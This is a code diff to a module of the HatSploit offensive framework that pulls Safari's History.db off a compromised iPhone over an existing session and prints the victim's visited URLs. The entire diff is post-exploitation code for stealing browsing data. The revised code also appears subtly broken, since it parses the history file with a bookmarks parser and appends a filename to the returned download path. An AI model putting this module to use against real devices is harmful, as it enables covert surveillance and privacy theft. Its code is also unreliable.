@@ -6,15 +6,12 @@
 #
 
 from hatsploit.lib.module import Module
-from hatsploit.lib.config import Config
 
 from hatsploit.utils.session import SessionTools
 from hatsploit.utils.db import DBTools
 
 
 class HatSploitModule(Module, SessionTools, DBTools):
-    config = Config()
-
     details = {
         'Name': "Obtain Safari history",
         'Module': "post/iphoneos/shell/safari_history",
@@ -40,26 +37,24 @@ class HatSploitModule(Module, SessionTools, DBTools):
 
     def run(self):
         session = self.parse_options(self.options)
-        session = self.get_session(session)
 
-        if session:
-            if session.download(
-                '/private/var/mobile/Library/Safari/History.db', self.config.path_config['loot_path']):
+        history_path = '/private/var/mobile/Library/Safari/History.db'
+        local_path = self.session_download(session, history_path)
 
-                self.print_process("Parsing history database...")
-                try:
-                    history = self.parse_safari_history(self.config.path_config['loot_path'] + 'History.db')
-                except Exception:
-                    self.print_error("Failed to parse history database!")
-                    return
+        if local_path:
+            self.print_process("Parsing history database...")
 
-                headers = ('Date', 'URL')
-                history_data = []
+            try:
+                history = self.parse_safari_bookmarks(local_path + 'History.db')
+            except Exception:
+                self.print_error("Failed to parse history database!")
+                return
 
-                for item in history:
-                    history_data.append((item['date'], item['details']['url']))
+            history_data = []
+            for item in history:
+                history_data.append((item['date'], item['details']['url']))
 
-                if history_data:
-                    self.print_table("History", headers, *history_data)
-                else:
-                    self.print_warning("No history available on device.")
+            if history_data:
+                self.print_table("History", ('Date', 'URL'), *history_data)
+            else:
+                self.print_warning("No history available on device.")
